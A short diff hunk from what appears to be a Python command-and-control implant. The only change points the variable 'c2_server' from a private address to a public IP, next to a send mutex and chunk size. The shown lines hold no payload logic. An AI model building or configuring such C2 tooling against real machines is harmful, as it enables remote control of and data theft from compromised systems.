@@ -6,7 +6,7 @@ from base64 import *
 import os
 import time
 
-c2_server = "192.168.6.11"
+c2_server = "16.16.76.151"
 stop = 0
 send_mutex = Lock()
 chunk_size = 4
